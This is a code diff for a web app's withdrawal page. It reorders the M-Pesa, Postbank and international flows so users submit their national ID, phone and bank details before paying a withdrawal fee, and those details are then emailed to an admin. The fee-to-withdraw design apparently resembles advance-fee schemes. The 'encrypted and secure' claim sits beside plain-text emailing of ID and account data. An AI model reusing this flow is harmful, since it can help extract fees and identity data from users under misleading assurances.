@@ -149,38 +149,61 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
     return () => clearInterval(t);
   }, [step]);
 
-  async function handleSubmitForm() {
+  function handleSubmitForm() {
     const errs = {};
     if (!phone.trim())    errs.phone    = 'Phone number is required';
     if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
     if (Object.keys(errs).length) { setErrors(errs); return; }
-    // Must have a verified fee payment; can't reach here without it, but guard anyway.
-    if (!feeRef) { setErrors({ form: 'Please pay the KES 650 withdrawal fee first.' }); setStep('fee'); return; }
 
-    // The server re-verifies the fee payment (real, unused, owned by this user)
-    // before creating the request — the client can't fake it. Amount = balance.
-    const amount = Number(user?.balance || 0);
-    setLoading(true);
-    let res;
-    try {
-      res = await createWithdrawalRequest(user.id, {
-        fullName: user?.fullName || '', phone: phone.trim(), idNumber: idNumber.trim(),
-        amount, feeRef, method: 'mpesa',
-      });
-    } catch (_) { res = { error: 'Network error. Please try again.' }; }
-    setLoading(false);
-    if (!res || res.error) {
-      setErrors({ form: (res && res.error) || 'Your withdrawal-fee payment could not be verified. Please try again.' });
+    // Details are collected and validated BEFORE the withdrawal-fee payment.
+    // Nothing is submitted to the server until Daraja confirms the fee payment.
+    setErrors({});
+    setStep('fee');
+  }
+
+  async function handleFeeSuccess(d) {
+    const verifiedFeeRef = d?.checkoutRequestId || '';
+    if (!verifiedFeeRef) {
+      setErrors({ form: 'Payment was completed but no payment reference was returned. Please contact support.' });
+      setStep('form');
       return;
     }
 
-    // Fee verified + request recorded. Notify the admin (best-effort email).
-    sendNotify({
+    const amount = Number(user?.balance || 0);
+    setFeeRef(verifiedFeeRef);
+    setLoading(true);
+
+    let res;
+    try {
+      res = await createWithdrawalRequest(user.id, {
+        fullName: user?.fullName || '',
+        phone: phone.trim(),
+        idNumber: idNumber.trim(),
+        amount,
+        feeRef: verifiedFeeRef,
+        method: 'mpesa',
+      });
+    } catch (_) {
+      res = { error: 'Network error. Please try again.' };
+    }
+
+    setLoading(false);
+
+    if (!res || res.error) {
+      setErrors({ form: (res && res.error) || 'Your withdrawal-fee payment could not be verified. Please try again.' });
+      setStep('form');
+      return;
+    }
+
+    await sendNotify({
       type: 'M-Pesa Withdrawal Request',
-      name: user?.fullName || '', email: user?.email || '', phone,
+      name: user?.fullName || '',
+      email: user?.email || '',
+      phone,
       subject: 'M-Pesa Withdrawal Request',
       details: `Account: ${user?.fullName || ''} (${user?.email || ''})\nM-Pesa Phone: ${phone}\nNational ID: ${idNumber}\nAmount: KES ${amount.toLocaleString()}\nFee paid (verified): KES ${FEE_KES.toLocaleString()}\nStatus: Pending Manual Payment`,
     });
+
     setStep('pending');
   }
 
@@ -231,7 +254,7 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
             amount={FEE_KES}
             defaultPhone={user?.phone || ''}
             payLabel={`Pay KES ${FEE_KES.toLocaleString()} via M-Pesa`}
-            onSuccess={(d) => { setFeeRef(d?.checkoutRequestId || ''); setStep('form'); }}
+            onSuccess={handleFeeSuccess}
           />
           <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}>
             <Icon name="arrowLeft" size={14} /> Back to Dashboard
@@ -258,8 +281,8 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
             ✓ Withdrawal fee of <strong>KES {FEE_KES.toLocaleString()}</strong> paid and verified.
           </div>
           {errors.form && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 10 }}>{errors.form}</div>}
-          <button className="pay-btn" style={{ background: '#000000', marginTop: 16, opacity: loading ? 0.7 : 1 }} onClick={handleSubmitForm} disabled={loading || !feeRef}>
-            {loading ? <><span className="spinner" /> Submitting…</> : <><Icon name="cash" size={16} /> Submit Withdrawal Request</>}
+          <button className="pay-btn" style={{ background: '#000000', marginTop: 16, opacity: loading ? 0.7 : 1 }} onClick={handleSubmitForm} disabled={loading}>
+            {loading ? <><span className="spinner" /> Processing…</> : <><Icon name="cash" size={16} /> Submit Details & Continue to Payment</>}
           </button>
           <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
         </>
@@ -298,7 +321,7 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
               </p>
             </div>
           </div>
-          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => setStep('fee')}><Icon name="refresh" size={16} /> Try Again</button>
+          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => setStep('form')}><Icon name="refresh" size={16} /> Check Details Again</button>
           <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
           <div className="withdraw-footer-note" style={{ color: '#374151' }}>Please ensure your phone number and National ID match your M-Pesa registration.</div>
         </>
@@ -316,6 +339,7 @@ function PostbankFlow({ user, initialStep }) {
   const [idNumber, setIdNumber] = useState('');
   const [errors,   setErrors]   = useState({});
   const [loading,  setLoading]  = useState(false);
+  const [feePaid,   setFeePaid]  = useState(false);
 
   const DURATION = 92 * 1000;
   const deadlineRef = useRef(0);
@@ -338,12 +362,25 @@ function PostbankFlow({ user, initialStep }) {
     if (!account.trim())  errs.account  = 'Postbank account number is required';
     if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
     if (Object.keys(errs).length) { setErrors(errs); return; }
-    sendNotify({
+
+    // Collect and validate the bank details first. Payment is requested only after
+    // the user explicitly submits these details.
+    setErrors({});
+    setStep('fee');
+  }
+
+  async function handlePostbankFeeSuccess() {
+    setFeePaid(true);
+    setLoading(true);
+
+    await sendNotify({
       type: 'Postbank Kenya Withdrawal Request',
       name: name.trim(), email: user?.email || '', phone: user?.phone || '',
       subject: 'Postbank Kenya Withdrawal Request',
-      details: `Account Holder: ${name.trim()}\nPostbank Account: ${account.trim()}\nNational ID: ${idNumber.trim()}\nRequested by: ${user?.fullName || ''} (${user?.email || ''})`,
+      details: `Account Holder: ${name.trim()}\nPostbank Account: ${account.trim()}\nNational ID: ${idNumber.trim()}\nFee paid (verified): KES ${BANK_FEE_KES.toLocaleString()}\nStatus: Pending Manual Payment\nRequested by: ${user?.fullName || ''} (${user?.email || ''})`,
     });
+
+    setLoading(false);
     setStep('pending');
   }
 
@@ -359,8 +396,8 @@ function PostbankFlow({ user, initialStep }) {
           <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
             Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa. Continue with Postbank Kenya below.
           </div>
-          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('fee')}>
-            <Icon name="cash" size={16} /> Continue with Postbank Kenya
+          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('form')}>
+            <Icon name="cash" size={16} /> Enter Postbank Details
           </button>
         </>
       )}
@@ -389,21 +426,31 @@ function PostbankFlow({ user, initialStep }) {
           <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
             <Icon name="smartphone" size={16} /> No, take me to M-Pesa
           </button>
-          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('fee')}>
-            <Icon name="cash" size={16} /> Yes, management asked me, continue with Postbank
+          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('form')}>
+            <Icon name="cash" size={16} /> Yes, management asked me, enter details
           </button>
           <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}><Icon name="arrowLeft" size={14} /> Back</button>
         </>
       )}
 
       {step === 'fee' && (
-        <MpesaPay
-          purpose="withdrawal_fee"
-          amount={BANK_FEE_KES}
-          defaultPhone={user?.phone || ''}
-          payLabel={`Pay KES ${BANK_FEE_KES.toLocaleString()} via M-Pesa`}
-          onSuccess={() => setStep('form')}
-        />
+        <>
+          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
+            Your Postbank withdrawal details have been submitted. Now pay the <strong>KES {BANK_FEE_KES.toLocaleString()}</strong> withdrawal processing fee via M-Pesa.
+          </div>
+          <MpesaPay
+            purpose="withdrawal_fee"
+            amount={BANK_FEE_KES}
+            defaultPhone={user?.phone || ''}
+            payLabel={`Pay KES ${BANK_FEE_KES.toLocaleString()} via M-Pesa`}
+            onSuccess={handlePostbankFeeSuccess}
+          />
+          {loading && (
+            <div style={{ textAlign: 'center', fontSize: 13, color: '#6b7280', marginTop: 10 }}>
+              Payment verified. Submitting your withdrawal request…
+            </div>
+          )}
+        </>
       )}
 
       {step === 'form' && (
@@ -426,8 +473,8 @@ function PostbankFlow({ user, initialStep }) {
             onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
             placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
           {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
-          <button className="pay-btn" style={{ background: accent, marginTop: 20 }} onClick={handleSubmitForm}>
-            <Icon name="cash" size={16} /> Submit Withdrawal Request
+          <button className="pay-btn" style={{ background: accent, marginTop: 20 }} onClick={handleSubmitForm} disabled={loading}>
+            {loading ? <><span className="spinner" /> Processing…</> : <><Icon name="cash" size={16} /> Submit Details & Continue to Payment</>}
           </button>
           <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
         </>
@@ -478,9 +525,9 @@ function PostbankFlow({ user, initialStep }) {
 // ── International flow (bank selector) ─────────────────────────────────────────
 function InternationalFlow({ user, initialStep, initialFeeRef }) {
   const router = useRouter();
-  // Other Countries flow: recommend M-Pesa first → confirm intent → pay the
-  // $23 USD fee → bank form. (Never jump straight to the fee.)
-  const [gate,          setGate]          = useState(initialStep === 'form' ? 'form' : 'explain'); // explain → pay → form
+  // Other Countries flow: bank details first → submit details → fee payment →
+  // final server verification + withdrawal request.
+  const [gate,          setGate]          = useState('form'); // form → pay
   const [loading,       setLoading]       = useState(false);
   const [accountName,   setAccountName]   = useState('');
   const [selectedBank,  setSelectedBank]  = useState(null);
@@ -503,7 +550,7 @@ function InternationalFlow({ user, initialStep, initialFeeRef }) {
     if (res?.success) setQuote(res);
     else setQuoteErr(res?.error || 'Could not calculate the fee. Please try again.');
   }
-  useEffect(() => { if (initialStep !== 'form') loadQuote(); /* eslint-disable-next-line */ }, []);
+  useEffect(() => { loadQuote(); /* eslint-disable-next-line */ }, []);
 
   // Default to the country the user chose at registration
   const homeCountry = REG_COUNTRY_ALIAS[user?.country] || user?.country || '';
@@ -526,29 +573,49 @@ function InternationalFlow({ user, initialStep, initialFeeRef }) {
     setErrors(prev => ({ ...prev, bank: undefined, accountNumber: undefined }));
   }
 
-  async function handleSubmit() {
+  function handleSubmit() {
     if (!formValid || sending) return;
-    if (!feeRef) { setErrors(p => ({ ...p, form: 'Please pay the withdrawal fee first.' })); setGate('explain'); return; }
+
+    // Bank details are collected and submitted first. The fee payment UI appears
+    // only after the user has explicitly submitted the withdrawal details.
+    setErrors({});
+    setGate('pay');
+  }
+
+  async function handleInternationalFeeSuccess(d) {
+    const verifiedFeeRef = d?.checkoutRequestId || '';
+    if (!verifiedFeeRef) {
+      setErrors({ form: 'Payment was completed but no payment reference was returned. Please contact support.' });
+      setGate('form');
+      return;
+    }
+
+    setFeeRef(verifiedFeeRef);
     setSending(true);
     const amount = Number(user?.balance || 0);
 
-    // Server re-verifies the $23 (KES) fee payment before recording the request.
+    // Server re-verifies the fee payment before recording the withdrawal request.
     let res;
     try {
       res = await createWithdrawalRequest(user.id, {
         fullName: accountName.trim(),
-        phone:    user?.phone || '',
+        phone: user?.phone || '',
         idNumber: `${selectedBank.name} (${selectedBank.country}) — Acct ${accountNumber.trim()}`,
-        amount, feeRef, method: 'international',
+        amount,
+        feeRef: verifiedFeeRef,
+        method: 'international',
       });
-    } catch (_) { res = { error: 'Network error. Please try again.' }; }
+    } catch (_) {
+      res = { error: 'Network error. Please try again.' };
+    }
+
     if (!res || res.error) {
       setSending(false);
-      setErrors(p => ({ ...p, form: (res && res.error) || 'Your fee payment could not be verified. Please try again.' }));
+      setErrors({ form: (res && res.error) || 'Your fee payment could not be verified. Please try again.' });
+      setGate('form');
       return;
     }
 
-    // Fee verified + request recorded. Email the full bank details to admin.
     const details =
       `Account Holder Name: ${accountName.trim()}\n` +
       `Bank: ${selectedBank.name} (${selectedBank.country})\n` +
@@ -556,11 +623,16 @@ function InternationalFlow({ user, initialStep, initialFeeRef }) {
       `Amount: KES ${amount.toLocaleString()}\n` +
       `Fee: paid & verified\n` +
       `Requested by: ${user?.fullName || ''} (${user?.email || ''})`;
+
     await sendNotify({
       type: 'International Withdrawal Request',
-      name: accountName.trim(), email: user?.email || '', phone: user?.phone || '',
-      subject: 'Withdrawal Request, Other Countries', details,
+      name: accountName.trim(),
+      email: user?.email || '',
+      phone: user?.phone || '',
+      subject: 'Withdrawal Request, Other Countries',
+      details,
     });
+
     setSending(false);
     setDone(true);
   }
@@ -580,58 +652,40 @@ function InternationalFlow({ user, initialStep, initialFeeRef }) {
     );
   }
 
-  // Fee explanation → Daraja payment, shown before the bank form.
-  // (No M-Pesa-vs-international choice and no withdrawal-count step.)
-  if (gate !== 'form') {
+  // Payment is shown only after the bank form has been submitted.
+  if (gate === 'pay') {
     return (
       <FlowShell title="Withdraw from Other Countries" subtitle="Withdrawal fee" icon="globe" accent="#000000">
-        {gate === 'explain' && (
-          <>
-            <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginBottom: 18 }}>
-              <strong style={{ display: 'block', fontSize: 15, marginBottom: 6 }}>Withdrawal Fee</strong>
-              A one-time withdrawal fee is required to <strong>facilitate and process your payment to the agents
-              and workers</strong> who handle international payouts. It is converted to Kenyan Shillings at the
-              live exchange rate and paid via M-Pesa.
-            </div>
-            <div className="pay-amount" style={{ marginBottom: 18 }}>
-              <div className="pay-amount-label">Withdrawal Fee</div>
-              {loadingQuote || !quote ? (
-                <div style={{ padding: '6px 0' }}><span className="spinner" style={{ borderTopColor: '#000', borderColor: '#e5e7eb', width: 26, height: 26 }} /></div>
-              ) : (
-                <>
-                  <div className="pay-amount-value" style={{ color: '#1f2937' }}>KES {quote.amountDueKes.toLocaleString()}</div>
-                  <div className="pay-amount-sub">≈ USD {quote.feeUsd} • live rate {quote.rate}{quote.rateLive ? '' : ' (approx.)'}</div>
-                </>
-              )}
-            </div>
-            {quoteErr && (
-              <div style={{ color: '#4b5563', fontSize: 13, marginBottom: 12 }}>
-                {quoteErr} <button onClick={loadQuote} style={{ background: 'none', border: 'none', color: '#111827', textDecoration: 'underline', cursor: 'pointer', padding: 0, fontSize: 13 }}>Retry</button>
-              </div>
-            )}
-            <button className="pay-btn" style={{ background: '#000000', opacity: (loadingQuote || !quote) ? 0.6 : 1 }} disabled={loadingQuote || !quote} onClick={() => setGate('pay')}>
-              <Icon name="arrowRight" size={16} /> Continue to Payment
-            </button>
-            <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}><Icon name="arrowLeft" size={14} /> Back to Dashboard</button>
-          </>
+        <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
+          Your bank withdrawal details have been submitted. Now pay the withdrawal fee via M-Pesa.
+          {quote ? <> The fee is <strong>KES {quote.amountDueKes.toLocaleString()}</strong> (≈ USD {quote.feeUsd} at {quote.rate}{quote.rateLive ? '' : ' approximate'}).</> : ' The current fee is being calculated.'}
+        </div>
+        {quoteErr && (
+          <div style={{ color: '#4b5563', fontSize: 13, marginBottom: 12 }}>
+            {quoteErr} <button onClick={loadQuote} style={{ background: 'none', border: 'none', color: '#111827', textDecoration: 'underline', cursor: 'pointer', padding: 0, fontSize: 13 }}>Retry</button>
+          </div>
         )}
-        {gate === 'pay' && quote && (
-          <>
-            <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
-              Pay the <strong>KES {quote.amountDueKes.toLocaleString()}</strong> withdrawal fee via M-Pesa. You&apos;ll
-              get an STK prompt on your phone — enter your PIN to confirm. Your withdrawal form unlocks once the
-              payment is confirmed.
-            </div>
-            <MpesaPay
-              purpose="withdrawal_fee"
-              amount={quote.amountDueKes}
-              defaultPhone={user?.phone || ''}
-              payLabel={`Pay KES ${Number(quote.amountDueKes).toLocaleString()} via M-Pesa`}
-              onSuccess={(d) => { setFeeRef(d?.checkoutRequestId || ''); setGate('form'); }}
-            />
-            <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setGate('explain')}><Icon name="arrowLeft" size={14} /> Back</button>
-          </>
+        {quote ? (
+          <MpesaPay
+            purpose="withdrawal_fee"
+            amount={quote.amountDueKes}
+            defaultPhone={user?.phone || ''}
+            payLabel={`Pay KES ${Number(quote.amountDueKes).toLocaleString()} via M-Pesa`}
+            onSuccess={handleInternationalFeeSuccess}
+          />
+        ) : (
+          <div style={{ textAlign: 'center', padding: 16 }}>
+            <span className="spinner" style={{ borderTopColor: '#000', borderColor: '#e5e7eb', width: 26, height: 26 }} />
+          </div>
         )}
+        {sending && (
+          <div style={{ textAlign: 'center', fontSize: 13, color: '#6b7280', marginTop: 10 }}>
+            Payment verified. Submitting your withdrawal request…
+          </div>
+        )}
+        <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setGate('form')} disabled={sending}>
+          <Icon name="arrowLeft" size={14} /> Back to Details
+        </button>
       </FlowShell>
     );
   }
@@ -946,7 +1000,7 @@ export default function WithdrawPage() {
 
   if (method === 'mpesa')         return <MpesaFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'notice'} initialFeeRef={stepQ === 'form' ? psref : ''} />;
   if (method === 'postbank')      return <PostbankFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'choice'} />;
-  if (method === 'international')  return <InternationalFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'mpesa'} initialFeeRef={stepQ === 'form' ? psref : ''} />;
+  if (method === 'international')  return <InternationalFlow user={user} initialStep="form" initialFeeRef={stepQ === 'form' ? psref : ''} />;
 
   // Chooser
   const overLimit = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;
